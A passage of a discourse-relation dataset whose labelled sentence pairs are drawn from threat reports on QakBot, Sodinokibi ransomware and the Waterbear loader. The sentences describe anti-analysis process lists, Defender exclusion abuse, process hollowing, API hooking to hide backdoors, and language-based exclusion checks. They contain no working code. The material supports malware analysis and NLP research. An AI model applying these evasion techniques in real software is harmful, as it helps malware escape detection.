        "S1": "The results of our additional de-obfuscation efforts are confirmed when the QakBot Excel spreadsheet is run inside a sandbox in Figure 4 below.",
        "S2": "xckew.wle, DllRegisterServer'' execution",
        "relation": "MISC"
    },
    {
        "S1": "xckew.wle, DllRegisterServer'' execution",
        "S2": "Before executing the main payload, the QakBot loader will first test the infected system to see if it is a good candidate for infection.",
        "relation": "MISC"
    },
    {
        "S1": "Before executing the main payload, the QakBot loader will first test the infected system to see if it is a good candidate for infection.",
        "S2": "The QakBot loader is responsible for checking its environment to include whether it is running on a Virtual Machine, identifying any installed and running security and monitoring tools such as AntiVirus products or common security researcher tools.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The QakBot loader is responsible for checking its environment to include whether it is running on a Virtual Machine, identifying any installed and running security and monitoring tools such as AntiVirus products or common security researcher tools.",
        "S2": "Figure 5 below shows a high-level execution flow of the QakBot loader.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Figure 5 below shows a high-level execution flow of the QakBot loader.",
        "S2": "To make detection and analysis harder, QakBot encrypts its strings and decrypts them at runtime before use.",
        "relation": "MISC"
    },
    {
        "S1": "To make detection and analysis harder, QakBot encrypts its strings and decrypts them at runtime before use.",
        "S2": "Once the QakBot execution logic is finished using a string, it will immediately delete the string from memory.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the QakBot execution logic is finished using a string, it will immediately delete the string from memory.",
        "S2": "An example of this can be seen in Figure 6 below, which shows QakBot decrypting a string containing the value for lpProcName passed as a parameter to the GetProcAddress API call.",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example of this can be seen in Figure 6 below, which shows QakBot decrypting a string containing the value for lpProcName passed as a parameter to the GetProcAddress API call.",
        "S2": "The selected function, which has been labeled in IDA Pro as, \u201coc_clear_mem\u201d deletes the string memory right after it retrieves the process address.",
        "relation": "NEXT"
    },
    {
        "S1": "The selected function, which has been labeled in IDA Pro as, \u201coc_clear_mem\u201d deletes the string memory right after it retrieves the process address.",
        "S2": "When executed, QakBot will check whether it has previously been executed on the machine by checking for the specified malware folder.",
        "relation": "MISC"
    },
    {
        "S1": "When executed, QakBot will check whether it has previously been executed on the machine by checking for the specified malware folder.",
        "S2": "If QakBot discovers it is a first time run, it will relaunch itself from cmd.exe with the /C parameter that will inform the loader to proceed and run its Anti-VM checks on the machine and return the results to the parent process.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If QakBot discovers it is a first time run, it will relaunch itself from cmd.exe with the /C parameter that will inform the loader to proceed and run its Anti-VM checks on the machine and return the results to the parent process.",
        "S2": "If QakBot detects it is running in a VM environment, then the final payload will not be decrypted since QakBot uses the return value from these checks in its final decryption routine.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If QakBot detects it is running in a VM environment, then the final payload will not be decrypted since QakBot uses the return value from these checks in its final decryption routine.",
        "S2": "Figure 7 below shows the QakBot environment check logic.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Figure 7 below shows the QakBot environment check logic.",
        "S2": "Specifically, QakBot checks the system for the names of running processes that match the strings listed in Table 1 below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Specifically, QakBot checks the system for the names of running processes that match the strings listed in Table 1 below.",
        "S2": "PROCESS NAMES Autoruns.exe bds-vision-agent-app.exe bds-vision-agent-nai.exe bds-vision-apis.exe",
        "relation": "ELABORATION"
    },
    {
        "S1": "PROCESS NAMES Autoruns.exe bds-vision-agent-app.exe bds-vision-agent-nai.exe bds-vision-apis.exe",
        "S2": "CFF Explorer.exe",
        "relation": "LIST"
    },
    {
        "S1": "CFF Explorer.exe",
        "S2": "dsniff.exe",
        "relation": "LIST"
    },
    {
        "S1": "dsniff.exe",
        "S2": "dumpcap.exe",
        "relation": "LIST"
    },
    {
        "S1": "dumpcap.exe",
        "S2": "Fiddler.exe",
        "relation": "LIST"
    },
    {
        "S1": "Fiddler.exe",
        "S2": "HashMyFiles.exe",
        "relation": "LIST"
    },
    {
        "S1": "HashMyFiles.exe",
        "S2": "idaq.exe",
        "relation": "LIST"
    },
    {
        "S1": "idaq.exe",
        "S2": "idaq64.exe",
        "relation": "LIST"
    },
    {
        "S1": "idaq64.exe",
        "S2": "lordpe.exe",
        "relation": "LIST"
    },
    {
        "S1": "lordpe.exe",
        "S2": "MultiAnalysis_v1.0.294.exe",
        "relation": "LIST"
    },
    {
        "S1": "MultiAnalysis_v1.0.294.exe",
        "S2": "netmon.exe",
        "relation": "LIST"
    },
    {
        "S1": "netmon.exe",
        "S2": "OLLYDBG.EXE pr0c3xp.exe",
        "relation": "LIST"
    },
    {
        "S1": "OLLYDBG.EXE pr0c3xp.exe",
        "S2": "ProcessHacker.exe",
        "relation": "LIST"
    },
    {
        "S1": "ProcessHacker.exe",
        "S2": "Procmon.exe",
        "relation": "LIST"
    },
    {
        "S1": "Procmon.exe",
        "S2": "Procmon64.exe regshot.exe",
        "relation": "LIST"
    },
    {
        "S1": "Procmon64.exe regshot.exe",
        "S2": "ResourceHacker.exe runsample.exe",
        "relation": "LIST"
    },
    {
        "S1": "ResourceHacker.exe runsample.exe",
        "S2": "samp1e.exe sample.exe",
        "relation": "LIST"
    },
    {
        "S1": "samp1e.exe sample.exe",
        "S2": "Tcpview.exe",
        "relation": "LIST"
    },
    {
        "S1": "Tcpview.exe",
        "S2": "TPAutoConnect.exe",
        "relation": "LIST"
    },
    {
        "S1": "TPAutoConnect.exe",
        "S2": "VBoxService.exe",
        "relation": "LIST"
    },
    {
        "S1": "VBoxService.exe",
        "S2": "VBoxTray.exe",
        "relation": "LIST"
    },
    {
        "S1": "VBoxTray.exe",
        "S2": "VGAuthService.exe",
        "relation": "LIST"
    },
    {
        "S1": "VGAuthService.exe",
        "S2": "vm3dservice.exe",
        "relation": "LIST"
    },
    {
        "S1": "vm3dservice.exe",
        "S2": "vmacthlp.exe",
        "relation": "LIST"
    },
    {
        "S1": "vmacthlp.exe",
        "S2": "vmtoolsd.exe",
        "relation": "LIST"
    },
    {
        "S1": "vmtoolsd.exe",
        "S2": "windbg.exe",
        "relation": "LIST"
    },
    {
        "S1": "windbg.exe",
        "S2": "Wireshark.exe x32dbg.exe",
        "relation": "LIST"
    },
    {
        "S1": "Wireshark.exe x32dbg.exe",
        "S2": "x64dbg.exe",
        "relation": "LIST"
    },
    {
        "S1": "x64dbg.exe",
        "S2": "QakBot will also add its folder to the Windows Defender exclusions setting located in the Registry (T1112), which prevents Defender from scanning QakBot artifacts.",
        "relation": "MISC"
    },
    {
        "S1": "QakBot will also add its folder to the Windows Defender exclusions setting located in the Registry (T1112), which prevents Defender from scanning QakBot artifacts.",
        "S2": "The Registry location can be seen in Figure 9 below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Registry location can be seen in Figure 9 below.",
        "S2": "In addition to the previously mentioned environment check, QakBot collects system information (T1082) such as computer name, system directories, user profiles, and more, which is shown in Figure 10 below.",
        "relation": "MISC"
    },
    {
        "S1": "In addition to the previously mentioned environment check, QakBot collects system information (T1082) such as computer name, system directories, user profiles, and more, which is shown in Figure 10 below.",
        "S2": "QakBot will use process hollowing (T1055.012) in order to inject itself into explorer.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "QakBot will use process hollowing (T1055.012) in order to inject itself into explorer.exe.",
        "S2": "If it is unsuccessful then QakBot will attempt to inject itself into mobsync.exe or iexplore.exe.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If it is unsuccessful then QakBot will attempt to inject itself into mobsync.exe or iexplore.exe.",
        "S2": "The screen shot in Figure 11 illustrates the QakBot process name decryption routine.",
        "relation": "MISC"
    },
    {
        "S1": "The screen shot in Figure 11 illustrates the QakBot process name decryption routine.",
        "S2": "Additionally, QakBot abuses the Service Control Manager (SCM) to create a child process, which is then detached from the parent when the SCM terminates the parent process.",
        "relation": "NEXT"
    },
    {
        "S1": "Additionally, QakBot abuses the Service Control Manager (SCM) to create a child process, which is then detached from the parent when the SCM terminates the parent process.",
        "S2": "QakBot C2 communications begin in this stage to make it more difficult to monitor.",
        "relation": "NEXT"
    },
    {
        "S1": "QakBot C2 communications begin in this stage to make it more difficult to monitor.",
        "S2": "Figure 13 below shows the SCM spawned process abuse technique.",
        "relation": "MISC"
    },
    {
        "S1": "Figure 13 below shows the SCM spawned process abuse technique.",
        "S2": "Finally, if the QakBot loader has verified its execution environment has passed its tests, then QakBot will proceed to decrypt and execute the main QakBot payload, which is hidden as resource \u201c307\u201d.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Finally, if the QakBot loader has verified its execution environment has passed its tests, then QakBot will proceed to decrypt and execute the main QakBot payload, which is hidden as resource \u201c307\u201d.",
        "S2": "The decryption and import table resolution of its main payload is shown in Figure 15 below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The decryption and import table resolution of its main payload is shown in Figure 15 below.",
        "S2": "The combined anti-analysis and evasion techniques across the infection chain significantly impair antivirus, EDR, and other security defenses from detecting and preventing the initial infection.",
        "relation": "MISC"
    },
    {
        "S1": "The combined anti-analysis and evasion techniques across the infection chain significantly impair antivirus, EDR, and other security defenses from detecting and preventing the initial infection.",
        "S2": "Despite the limitations and challenges presented by QakBot DLLs there is ample opportunity to detect QakBot loaders signed by revoked and blacklisted malicious certificates.",
        "relation": "MISC"
    },
    {
        "S1": "Despite the limitations and challenges presented by QakBot DLLs there is ample opportunity to detect QakBot loaders signed by revoked and blacklisted malicious certificates.",
        "S2": "Alien Labs has identified 42 unique signers and signature serial numbers, which are included in Detection Methods section to aid in detection and hunting with YARA and Osquery.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Alien Labs has identified 42 unique signers and signature serial numbers, which are included in Detection Methods section to aid in detection and hunting with YARA and Osquery.",
        "S2": "Additionally, there are a number of behavioral patterns, Indicators of Behavior (IOB), which provide opportunities for detection.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Upon execution, Sodinokibi will create a mutex with a hardcoded name Global\\206D87E0-0E60-DF25-DD8F-8E4E7D1E3BF0 and decrypt an embedded configuration.",
        "S2": "If the exp parameter in the configuration is set, the malware will attempt to exploit CVE-2018-8453 in order to gain SYSTEM privileges (see the \u201cPrivilege escalation\u201d section for more details).",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the exp parameter in the configuration is set, the malware will attempt to exploit CVE-2018-8453 in order to gain SYSTEM privileges (see the \u201cPrivilege escalation\u201d section for more details).",
        "S2": "If not configured to execute the exploit, or if the attempt is unsuccessful, it will instead try to re-run itself as an administrator.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If not configured to execute the exploit, or if the attempt is unsuccessful, it will instead try to re-run itself as an administrator.",
        "S2": "Sodinokibi gathers some basic system information and saves it to the registry together with the generated encryption parameters.",
        "relation": "NEXT"
    },
    {
        "S1": "Sodinokibi gathers some basic system information and saves it to the registry together with the generated encryption parameters.",
        "S2": "If the dbg option is not set in the config, the UI language and keyboard layout values are checked, and the malware will simply exit on systems which use one of the following language codes:",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the dbg option is not set in the config, the UI language and keyboard layout values are checked, and the malware will simply exit on systems which use one of the following language codes:",
        "S2": "Code Language 0x818",
        "relation": "ELABORATION"
    },
    {
        "S1": "Code Language 0x818",
        "S2": "Romanian 0x419 Russian 0x819 Russian (Moldova) 0x422",
        "relation": "LIST"
    },
    {
        "S1": "Romanian 0x419 Russian 0x819 Russian (Moldova) 0x422",
        "S2": "Ukrainian 0x423 Belarusian 0x425 Estonian* 0x426 Latvian* 0x427 Lithuanian* 0x428 Tajik 0x429 Persian* 0x42B Armenian 0x42C Azeri 0x437",
        "relation": "LIST"
    },
    {
        "S1": "Ukrainian 0x423 Belarusian 0x425 Estonian* 0x426 Latvian* 0x427 Lithuanian* 0x428 Tajik 0x429 Persian* 0x42B Armenian 0x42C Azeri 0x437",
        "S2": "Georgian 0x43F Kazakh 0x440 Kygyz 0x442",
        "relation": "LIST"
    },
    {
        "S1": "Georgian 0x43F Kazakh 0x440 Kygyz 0x442",
        "S2": "Turkmen 0x443 Uzbek 0x444 Tatar 0x45A",
        "relation": "LIST"
    },
    {
        "S1": "Turkmen 0x443 Uzbek 0x444 Tatar 0x45A",
        "S2": "Syrian 0x2801",
        "relation": "LIST"
    },
    {
        "S1": "Syrian 0x2801",
        "S2": "Arabic (Syria)",
        "relation": "LIST"
    },
    {
        "S1": "Arabic (Syria)",
        "S2": "The malware will exit only if the keyboard layout value belongs to these countries, but the OS language value is equal to one of the remaining languages.",
        "relation": "MISC"
    },
    {
        "S1": "The malware will exit only if the keyboard layout value belongs to these countries, but the OS language value is equal to one of the remaining languages.",
        "S2": "If the system language is not one of the excluded languages, Sodinokibi will terminate all processes specified by the prc value in the config and delete volume shadow copies before starting the file encryption routine.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the system language is not one of the excluded languages, Sodinokibi will terminate all processes specified by the prc value in the config and delete volume shadow copies before starting the file encryption routine.",
        "S2": "The ransomware will then proceed to encrypt all files on local drives, skipping files and folders included on the config\u2019s exception list.",
        "relation": "NEXT"
    },
    {
        "S1": "The ransomware will then proceed to encrypt all files on local drives, skipping files and folders included on the config\u2019s exception list.",
        "S2": "Unless the executable was run with -nolan command line parameter, the malware will also attempt to encrypt files on network shares.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Unless the executable was run with -nolan command line parameter, the malware will also attempt to encrypt files on network shares.",
        "S2": "The file encryption routine is discussed in detail in the \u201cFile encryption\u201d section.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The file encryption routine is discussed in detail in the \u201cFile encryption\u201d section.",
        "S2": "Each encrypted file will be renamed by adding a previously generated pseudo-random extension, which is stored in the rnd_ext value in the registry.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Each encrypted file will be renamed by adding a previously generated pseudo-random extension, which is stored in the rnd_ext value in the registry.",
        "S2": "A README file will be dropped in each directory and the background wallpaper will be set with a ransom message:",
        "relation": "ELABORATION"
    },
    {
        "S1": "A README file will be dropped in each directory and the background wallpaper will be set with a ransom message:",
        "S2": "The contents of the README file, as well as the ransom message, are again specified in the config.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The contents of the README file, as well as the ransom message, are again specified in the config.",
        "S2": "The key requested by the attackers is a combination of the victim\u2019s system information and generated encryption metadata (needed to derive the decryption keys for the files), AES encrypted and base64 encoded (see \u201cFile encryption\u201d section for more details).",
        "relation": "MISC"
    },
    {
        "S1": "The key requested by the attackers is a combination of the victim\u2019s system information and generated encryption metadata (needed to derive the decryption keys for the files), AES encrypted and base64 encoded (see \u201cFile encryption\u201d section for more details).",
        "S2": "Other parameters from the configuration that affect the malware\u2019s behavior are wipe (if set, all the files in folders listed under wfld will be zeroed out and deleted) and net (if set, the ransomware will broadcast the victim's system information to a range of domains listed in the dmn value in the config).",
        "relation": "MISC"
    },
    {
        "S1": "We saw a Waterbear loader named \"ociw32.dll\" inside one of the folders in the %PATH% environmental variable.",
        "S2": "This DLL name is hardcoded inside \"mtxoci.dll\" which is loaded by the MSDTC service during boot-up.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This DLL name is hardcoded inside \"mtxoci.dll\" which is loaded by the MSDTC service during boot-up.",
        "S2": "\u201cmtxoci.dll\u201d first tries to query the registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI\" to see if the value \"OracleOciLib\" exists.",
        "relation": "NEXT"
    },
    {
        "S1": "\u201cmtxoci.dll\u201d first tries to query the registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI\" to see if the value \"OracleOciLib\" exists.",
        "S2": "If so, it retrieves the data inside it and loads the corresponding library.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If so, it retrieves the data inside it and loads the corresponding library.",
        "S2": "If the value doesn't exist, \u201cmtxoci.dll\u201d tries to load \"ociw32.dll\" instead.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the value doesn't exist, \u201cmtxoci.dll\u201d tries to load \"ociw32.dll\" instead.",
        "S2": "During our investigation, we noticed that the value \"OracleOciLib\" was deleted from the victim's machine, as shown in Figure 2.",
        "relation": "MISC"
    },
    {
        "S1": "During our investigation, we noticed that the value \"OracleOciLib\" was deleted from the victim's machine, as shown in Figure 2.",
        "S2": "Hence, the malicious loader \"ociw32.dll\" was loaded and successfully executed on the host.",
        "relation": "MISC"
    },
    {
        "S1": "Hence, the malicious loader \"ociw32.dll\" was loaded and successfully executed on the host.",
        "S2": "Note: The image on the left shows how the DLL on a normal machine normally looks.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Note: The image on the left shows how the DLL on a normal machine normally looks.",
        "S2": "The image on the right showcases how the DLL on a victim's machine appears.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The image on the right showcases how the DLL on a victim's machine appears.",
        "S2": "Because there is no \"OracleOciLib\" value, it loads the hardcoded DLL \"ociw32.dll\" instead, which triggers the malicious Waterbear DLL loader.",
        "relation": "MISC"
    },
    {
        "S1": "Because there is no \"OracleOciLib\" value, it loads the hardcoded DLL \"ociw32.dll\" instead, which triggers the malicious Waterbear DLL loader.",
        "S2": "After the Waterbear DLL loader is executed, it searches for a hardcoded path and tries to decrypt the corresponding payload, which is a piece of encrypted shellcode.",
        "relation": "NEXT"
    },
    {
        "S1": "After the Waterbear DLL loader is executed, it searches for a hardcoded path and tries to decrypt the corresponding payload, which is a piece of encrypted shellcode.",
        "S2": "The decryption algorithm is RC4, which takes the hardcoded path to form the decryption key.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The decryption algorithm is RC4, which takes the hardcoded path to form the decryption key.",
        "S2": "If the decrypted payload is valid, it picks a specific existing Windows Service \u2014 LanmanServer, which is run by svchost.exe \u2014 and injects the decrypted shellcode into the legitimate service.",
        "relation": "NEXT"
    },
    {
        "S1": "If the decrypted payload is valid, it picks a specific existing Windows Service \u2014 LanmanServer, which is run by svchost.exe \u2014 and injects the decrypted shellcode into the legitimate service.",
        "S2": "In most cases, the payload is a first-stage backdoor, and its main purpose is to retrieve second-stage payloads \u2014 either by connecting to a C&C server or opening a port to wait for external connections and load incoming executables.",
        "relation": "NEXT"
    },
    {
        "S1": "In most cases, the payload is a first-stage backdoor, and its main purpose is to retrieve second-stage payloads \u2014 either by connecting to a C&C server or opening a port to wait for external connections and load incoming executables.",
        "S2": "In order to avoid in-memory scanning during runtime, the payload encrypts all of the function blocks before executing the actual malicious routine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to avoid in-memory scanning during runtime, the payload encrypts all of the function blocks before executing the actual malicious routine.",
        "S2": "Afterwards, whenever it needs to use a function, it will decrypt the function, execute it, and encrypt the function back again, as can be seen in Figure 4.",
        "relation": "NEXT"
    },
    {
        "S1": "Afterwards, whenever it needs to use a function, it will decrypt the function, execute it, and encrypt the function back again, as can be seen in Figure 4.",
        "S2": "If a function will not be used on the rest of the execution, it will be scrambled by another mess-up function, as illustrated in Figure 6.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If a function will not be used on the rest of the execution, it will be scrambled by another mess-up function, as illustrated in Figure 6.",
        "S2": "The mess-up function muddles up the bytes with random values and makes the input blocks unrecoverable.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The mess-up function muddles up the bytes with random values and makes the input blocks unrecoverable.",
        "S2": "The purpose of this is to further avoid being detected by a certain cybersecurity solution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The purpose of this is to further avoid being detected by a certain cybersecurity solution.",
        "S2": "During our investigation, we found a peculiar incident that stands out from most of the Waterbear infections we\u2019ve previously seen.",
        "relation": "MISC"
    },
    {
        "S1": "During our investigation, we found a peculiar incident that stands out from most of the Waterbear infections we\u2019ve previously seen.",
        "S2": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "Meanwhile, the second payload is a typical Waterbear first-stage backdoor.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Meanwhile, the second payload is a typical Waterbear first-stage backdoor.",
        "S2": "Both payloads were encrypted and stored on the victim\u2019s disk and were injected into the same service, which was, in this case, LanmanServer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both payloads were encrypted and stored on the victim\u2019s disk and were injected into the same service, which was, in this case, LanmanServer.",
        "S2": "We have observed that the loader tried to read the payloads from the files, decrypted them, and performed thread injections with the following conditions:",
        "relation": "NEXT"
    },
    {
        "S1": "We have observed that the loader tried to read the payloads from the files, decrypted them, and performed thread injections with the following conditions:",
        "S2": "If the first payload could not be found on the disk, the loader would be terminated without loading the second one.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the first payload could not be found on the disk, the loader would be terminated without loading the second one.",
        "S2": "If the first payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to the first thread.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the first payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to the first thread.",
        "S2": "In the first injected thread, if the necessary executable from the security product was not found, the thread would be terminated without performing other malicious routines.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "In the first injected thread, if the necessary executable from the security product was not found, the thread would be terminated without performing other malicious routines.",
        "S2": "Note that only the thread would be terminated, but the service would still be running.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Note that only the thread would be terminated, but the service would still be running.",
        "S2": "Regardless if the API hooking was performed or otherwise, the second backdoor would still be executed after having been successfully loaded.",
        "relation": "MISC"
    },
    {
        "S1": "Regardless if the API hooking was performed or otherwise, the second backdoor would still be executed after having been successfully loaded.",
        "S2": "In order to hide the behaviors of the first-stage backdoor (which is the second payload), the first payload uses API hooking techniques to avoid being detected by a specific security product and to make an interference in the result of the function execution.",
        "relation": "MISC"
    },
    {
        "S1": "In order to hide the behaviors of the first-stage backdoor (which is the second payload), the first payload uses API hooking techniques to avoid being detected by a specific security product and to make an interference in the result of the function execution.",
        "S2": "It hooks two different APIs, namely \"ZwOpenProcess\" and \"GetExtendedTcpTable\", to hide its specific processes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It hooks two different APIs, namely \"ZwOpenProcess\" and \"GetExtendedTcpTable\", to hide its specific processes.",
        "S2": "The payload only modifies the functions in the memory of the security product process, hence the original system DLL files remain unchanged.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The payload only modifies the functions in the memory of the security product process, hence the original system DLL files remain unchanged.",
        "S2": "The payload is composed of a two-stage shellcode.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The payload is composed of a two-stage shellcode.",
        "S2": "The first-stage shellcode finds a specific security product's process with a hardcoded name and injects the second-stage shellcode into that process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The first-stage shellcode finds a specific security product's process with a hardcoded name and injects the second-stage shellcode into that process.",
        "S2": "The second-stage shellcode then performs API hooking inside the targeted process.",
        "relation": "NEXT"
    },
    {
        "S1": "The second-stage shellcode then performs API hooking inside the targeted process.",
        "S2": "The process identifiers or PIDs to be hidden are stored in the shared memory \"Global\\<computer_name>.\"",
        "relation": "NEXT"
    },
    {
        "S1": "The process identifiers or PIDs to be hidden are stored in the shared memory \"Global\\<computer_name>.\"",
        "S2": "If the shared memory doesn't exist, it takes the PID embedded by the first-stage shellcode.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the shared memory doesn't exist, it takes the PID embedded by the first-stage shellcode.",
        "S2": "In this case, the intention of the malicious code is to hide Waterbear\u2019s backdoor activities from the security product.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the intention of the malicious code is to hide Waterbear\u2019s backdoor activities from the security product.",
        "S2": "Therefore, the first-stage shellcode takes the PID of the Windows Service \u2014 which the first-stage shellcode and the succeeding backdoor both inject into \u2014 hides the target process, and embeds that PID into the second-stage shellcode.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Therefore, the first-stage shellcode takes the PID of the Windows Service \u2014 which the first-stage shellcode and the succeeding backdoor both inject into \u2014 hides the target process, and embeds that PID into the second-stage shellcode.",
        "S2": "The purpose of hooking \u201cZwOpenProcess\u201d is to protect the specific process from being accessed by the security product.",
        "relation": "MISC"
    },
    {
        "S1": "The purpose of hooking \u201cZwOpenProcess\u201d is to protect the specific process from being accessed by the security product.",
        "S2": "Whenever \u201cZwOpenProcess\u201d is called, the injected code will first check if the opened process hits any PIDs in the protected process ID list.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Whenever \u201cZwOpenProcess\u201d is called, the injected code will first check if the opened process hits any PIDs in the protected process ID list.",
        "S2": "If yes, it modifies the process ID, which should open on another Windows Service PID.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If yes, it modifies the process ID, which should open on another Windows Service PID.",
        "S2": "First, it builds the hooked function and writes the function at the end of \u201cntdll.dll\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "First, it builds the hooked function and writes the function at the end of \u201cntdll.dll\u201d.",
        "S2": "This function includes two parts, as shown in Figure 9:",
        "relation": "ELABORATION"
    },
    {
        "S1": "This function includes two parts, as shown in Figure 9:",
        "S2": "The PID checking procedure.",
        "relation": "MISC"
    },
    {
        "S1": "The PID checking procedure.",
        "S2": "It recursively checks if the PID to be opened by \u201cZwOpenProcess\u201d is in the list of the protected process IDs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It recursively checks if the PID to be opened by \u201cZwOpenProcess\u201d is in the list of the protected process IDs.",
        "S2": "If yes, it replaces the PID to be opened with another Windows Service PID that has been written by the Waterbear loader in the beginning.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If yes, it replaces the PID to be opened with another Windows Service PID that has been written by the Waterbear loader in the beginning.",
        "S2": "After the PID checking procedure, it executes the original \u201cZwOpenProcess\u201d and returns the result.",
        "relation": "NEXT"
    },
    {
        "S1": "After the PID checking procedure, it executes the original \u201cZwOpenProcess\u201d and returns the result.",
        "S2": "Secondly, it writes \"push <ADDRESS> ret\" at the beginning of the original \u201cZwOpenProcess\u201d address.",
        "relation": "NEXT"
    },
    {
        "S1": "Secondly, it writes \"push <ADDRESS> ret\" at the beginning of the original \u201cZwOpenProcess\u201d address.",
        "S2": "Hence, when \u201cZwOpenProcess\u201d is called, the modified version of \u201cZwOpenProcess\u201d will be executed.",
        "relation": "NEXT"
    },
    {
        "S1": "Hence, when \u201cZwOpenProcess\u201d is called, the modified version of \u201cZwOpenProcess\u201d will be executed.",
        "S2": "The API hooking on \u201cZwOpenProcess\u201d will only be triggered if \"%temp%\\KERNELBASE.dll\" exists on the host.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "The API hooking on \u201cZwOpenProcess\u201d will only be triggered if \"%temp%\\KERNELBASE.dll\" exists on the host.",
        "S2": "It is possible that this check is designed according to the nature of the security product it targets.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is possible that this check is designed according to the nature of the security product it targets.",
        "S2": "The second part of API hooking hooks on \u201cGetExtendedTcpTable.\u201d",
        "relation": "MISC"
    },
    {
        "S1": "The second part of API hooking hooks on \u201cGetExtendedTcpTable.\u201d",
        "S2": "\u201cGetExtendedTcpTable\u201d is used for retrieving a table that contains a list of TCP endpoints available to the application, and it is frequently used in some network-related commands, such as netstat.",
        "relation": "ELABORATION"
    },
    {
        "S1": "\u201cGetExtendedTcpTable\u201d is used for retrieving a table that contains a list of TCP endpoints available to the application, and it is frequently used in some network-related commands, such as netstat.",
        "S2": "The purpose of the hook is to remove TCP endpoint records of certain PIDs.",
        "relation": "MISC"
    },
    {
        "S1": "The purpose of the hook is to remove TCP endpoint records of certain PIDs.",
        "S2": "In order to achieve that, it modifies two functions: \u201cGetExtendedTcpTable\u201d and \u201cGetRTTAndHopCount.\u201d",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to achieve that, it modifies two functions: \u201cGetExtendedTcpTable\u201d and \u201cGetRTTAndHopCount.\u201d",
        "S2": "The second function, \u201cGetRTTAndHopCount,\u201d acts as the place to put the injected hooking code.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The second function, \u201cGetRTTAndHopCount,\u201d acts as the place to put the injected hooking code.",
        "S2": "\u201cGetExtendedTcpTable\u201d only writes a jump to \u201cGetRTTAndHopCount\u201d in the beginning of the function.",
        "relation": "ELABORATION"
    },
    {
        "S1": "\u201cGetExtendedTcpTable\u201d only writes a jump to \u201cGetRTTAndHopCount\u201d in the beginning of the function.",
        "S2": "Only the first 5 bytes of the code of the API \"GetExtendedTcpTable\" are changed, as shown in Figure 11.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Only the first 5 bytes of the code of the API \"GetExtendedTcpTable\" are changed, as shown in Figure 11.",
        "S2": "The rest of the routine is all placed in \u201cGetRTTAndHopCount.\u201d",
        "relation": "ELABORATION"
    },
    {
        "S1": "The rest of the routine is all placed in \u201cGetRTTAndHopCount.\u201d",
        "S2": "In the first part of the code, it pushes [\u201cGetRTTAndHopCount\u201d+0x3E] as the return address and then executes the first four instructions of the original \u201cGetExtendedTcpTable\u201d function (which has already been replaced by the jump instruction in Figure 11).",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the first part of the code, it pushes [\u201cGetRTTAndHopCount\u201d+0x3E] as the return address and then executes the first four instructions of the original \u201cGetExtendedTcpTable\u201d function (which has already been replaced by the jump instruction in Figure 11).",
        "S2": "After that, it jumps to \u201cGetExtendedTcpTable\u201d to execute the function normally and to catch its return values.",
        "relation": "NEXT"
    },
    {
        "S1": "After that, it jumps to \u201cGetExtendedTcpTable\u201d to execute the function normally and to catch its return values.",
        "S2": "The code is shown in Figure 12.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The code is shown in Figure 12.",
